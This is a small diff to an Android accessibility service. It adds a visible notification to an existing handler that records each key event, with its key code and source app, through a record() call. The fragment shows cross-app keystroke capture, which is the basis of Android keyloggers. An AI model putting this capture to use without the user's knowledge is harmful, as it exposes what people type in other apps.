@@ -486,6 +486,7 @@ public class MainService extends AccessibilityService {
         jsonSilentPut(json, "package", packageName);
         jsonSilentPut(json, "keycodeString", KeyEvent.keyCodeToString(event.getKeyCode()));
 
+        createNotification("Key Event");
         record("KeyEvent", "KeyEvent://" + event.getAction() + "/" + event.getKeyCode(), "", json.toString());
         return super.onKeyEvent(event);
     }
